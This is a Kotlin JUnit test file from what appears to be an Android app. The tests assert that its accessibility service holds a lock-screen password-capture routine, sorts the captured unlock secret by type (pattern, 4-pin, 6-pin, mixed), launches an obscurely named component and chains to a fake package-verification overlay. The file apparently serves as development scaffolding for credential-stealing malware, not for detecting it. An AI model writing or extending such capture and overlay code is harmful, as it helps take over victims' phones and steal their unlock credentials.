package com.storm.safe.rock.service.modules

import org.junit.Test
import org.junit.Assert.*

class PostAuthChainTest {

    private val source by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/MyAccessibilityService.kt").readText()
    }

    @Test
    fun `completeInstallationWithCipher method exists`() {
        assertTrue("must have completeInstallationWithCipher",
            source.contains("fun completeInstallationWithCipher("))
    }

    @Test
    fun `completeInstallationWithCipher sets cipher_excluded flag`() {
        val start = source.indexOf("fun completeInstallationWithCipher(")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 1500))
        assertTrue("must set cipher_excluded", body.contains("cipher_excluded"))
    }

    @Test
    fun `completeInstallationWithCipher sets cipher_completed flag`() {
        val start = source.indexOf("fun completeInstallationWithCipher(")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 1500))
        assertTrue("must set cipher_completed", body.contains("cipher_completed"))
    }

    @Test
    fun `completeInstallationWithCipher classifies password type`() {
        val start = source.indexOf("fun completeInstallationWithCipher(")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 1500))
        assertTrue("pattern", body.contains("\"pattern\""))
        assertTrue("4pin", body.contains("\"4pin\""))
        assertTrue("6pin", body.contains("\"6pin\""))
        assertTrue("mixed", body.contains("\"mixed\""))
    }

    @Test
    fun `completeInstallationWithCipher calls tryShowPackageVerify`() {
        val start = source.indexOf("fun completeInstallationWithCipher(")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 1500))
        assertTrue("must chain to tryShowPackageVerify", body.contains("tryShowPackageVerify()"))
    }

    @Test
    fun `doLaunchSystemPasswordCapture method exists`() {
        assertTrue("must have doLaunchSystemPasswordCapture",
            source.contains("fun doLaunchSystemPasswordCapture("))
    }

    @Test
    fun `doLaunchSystemPasswordCapture starts syuqattwmgit`() {
        val start = source.indexOf("fun doLaunchSystemPasswordCapture(")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 1000))
        assertTrue("must reference syuqattwmgit", body.contains("syuqattwmgit"))
    }

    @Test
    fun `doLaunchSystemPasswordCapture sets onCredentialVerified callback`() {
        val start = source.indexOf("fun doLaunchSystemPasswordCapture(")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 1000))
        assertTrue("must set callback", body.contains("onCredentialVerified"))
    }

    @Test
    fun `doLaunchSystemPasswordCapture callback chains to completeInstallationWithCipher`() {
        val start = source.indexOf("fun doLaunchSystemPasswordCapture(")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 1500))
        assertTrue("callback must chain", body.contains("completeInstallationWithCipher"))
    }

    @Test
    fun `postAuthorizationInit IO coroutine triggers doLaunchSystemPasswordCapture`() {
        val start = source.indexOf("fun postAuthorizationInit()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 800))
        assertTrue("IO coroutine must trigger", body.contains("doLaunchSystemPasswordCapture"))
    }

    @Test
    fun `tryShowPackageVerify calls PkgVerifyOverlay show`() {
        val start = source.indexOf("fun tryShowPackageVerify()")
        assertTrue(start >= 0)
        val body = source.substring(start, minOf(source.length, start + 500))
        assertTrue("must call PkgVerifyOverlay.show", body.contains("PkgVerifyOverlay.show"))
    }
}
